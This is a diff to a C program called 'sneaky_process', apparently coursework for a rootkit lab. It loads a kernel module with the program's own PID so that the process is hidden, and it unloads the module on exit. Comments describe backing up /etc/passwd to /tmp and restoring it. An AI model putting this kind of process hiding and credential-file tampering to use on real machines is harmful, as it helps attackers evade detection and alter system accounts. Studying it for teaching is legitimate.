@@ -6,6 +6,15 @@
 #include <stdlib.h>
 #include <fcntl.h>
 
+pid_t process_pid;
+
+void endProgram(void){
+	// 1. Unload the sneaky module using rmmod
+	char *rmCmd[] = {"rmmod","sneaky_mod.ko",0};
+	execvp(rmCmd[0],rmCmd);
+	// 2. Restore the /etc/passwd file by copying tmp/passwd into the file
+	
+}
 	
 void fileProc(void){
 	// 1. Copy /etc/passwd to /tmp/passwd
@@ -43,27 +52,40 @@ void kernelProc(void){
 	int status;
 	inpid = fork();
 	if(inpid == 0){
-		print("install the kernel mod");
-		char * modCmd[] = {"insmod", "sneaky_mod.ko",0};
+		printf("install the kernel mod");
+		char arg[15]= ""; 
+		snprintf(arg, sizeof(arg), "toHide=%d", process_pid);
+		char * modCmd[] = {"insmod", "sneaky_mod.ko",arg,0};
 		execvp(modCmd[0],modCmd);
 	}else{
 		do{
 			sneakpid = waitpid(inpid, &status, WUNTRACED | WCONTINUED);
 			if(sneakpid == -1){
-				perror("waitpid"):
+				perror("waitpid");
 				exit(EXIT_FAILURE);
 			}
-		} while(!WIFEXITE(status) && !WIFSIGNALED(status));
+		} while(!WIFEXITED(status) && !WIFSIGNALED(status));
 		// Enter loop get input character until q for quit
+		int c;
+		c = getchar();
+		while(c != 'q'){
+			//putchar(c);
+			c = getchar();
+		}
+		printf("typed a q so begin to get rid of everything\n");
 		// terminate
+		endProgram();
 	}
-
 }
 
 int main(int argc, char *argv[]){
 	pid_t fpid, kpid;
 	int status;
+	process_pid = getpid();
+	printf("sneaky_process pid =%d\n",process_pid);
+	
 	fpid = fork();
+
 	if(fpid == 0){
 		printf("executing file process...\n");
 		fileProc();
